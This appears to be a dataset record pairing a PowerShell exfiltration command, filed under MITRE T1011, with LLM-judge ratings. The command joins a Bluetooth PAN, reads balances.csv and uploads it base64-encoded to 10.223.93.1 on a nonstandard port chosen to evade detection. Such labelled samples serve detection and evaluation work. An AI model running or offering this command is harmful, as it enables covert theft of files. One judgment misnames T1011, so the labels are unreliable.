command: & 'C:\Tools\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name="$if" static 10.223.93.2 255.255.255.252 | Out-Null; $body=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\Users\Public\Documents\balances.csv')); $ProgressPreference='SilentlyContinue'; Invoke-RestMethod -Uri 'http://10.223.93.1:52901/api/upload' -Method Put -Body $body -Headers @{ 'X-From'='btpan' } | Out-Null
explanation: Uses HTTP PUT to a custom port over a Bluetooth PAN-isolated subnet to exfiltrate base64 data, aligning with exfiltration over another network medium (T1011).
rationale_steps: Establish Bluetooth PAN connectivity using a Bluetooth manipulation tool.
Assign a static /30 address to the Bluetooth interface with netsh.
Send base64 data using HTTP on a nonstandard port to reduce detection.
Destination IP is only reachable over Bluetooth, forcing that medium.

llm_judgments.syntactic_justification: The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax for variable assignment, piping, and method invocation with no syntax errors.
llm_judgments.semantic_justification: The command aligns well with T1011 exfiltration over alternative protocol by establishing a Bluetooth PAN connection, configuring a static IP, and exfiltrating base64-encoded file data via HTTP PUT, though it focuses on exfiltration rather than firmware modification described in the technique.

llm_judgments.syntactic_justification: The command is perfectly well-formed, demonstrating correct PowerShell syntax for external commands, variable assignments, pipeline usage, .NET method calls, and command separators.
llm_judgments.semantic_justification: The command's actions of establishing a Bluetooth PAN connection and exfiltrating data via HTTP PUT are entirely unrelated to the T1011 'Modify System Image' technique, which involves altering OS/firmware images.

llm_judgments.syntactic_justification: The PowerShell one-liner has balanced quotes/parentheses, valid separators and operators, proper variable expansion, and well-formed arguments/hashtable constructs.
llm_judgments.semantic_justification: It plausibly connects to a Bluetooth PAN, configures an IP, base64-encodes a file, and exfiltrates it via HTTP PUT over that link (consistent with T1011), but success hinges on the specific BluetoothCL tool supporting /connect NAP and on having sufficient privileges for netsh IP configuration.
